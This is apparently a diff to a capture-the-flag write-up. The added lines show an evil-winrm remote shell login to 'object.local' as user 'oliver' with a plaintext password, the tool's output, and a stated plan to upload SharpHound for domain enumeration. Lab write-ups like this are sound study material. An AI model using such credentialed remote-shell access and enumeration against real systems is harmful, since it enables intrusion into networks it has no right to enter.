@@ -335,5 +335,17 @@ https://github.com/gquere/pwn_jenkins
 # Evil-winrm access as `oliver`
 
 ```python
-
+evil-winrm -i object.local -u oliver -p 'c1cdfun_d2434'                               
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\oliver\Documents>
 ```
+No interesting privileges
+
+I think ill upload sharphound to the target 
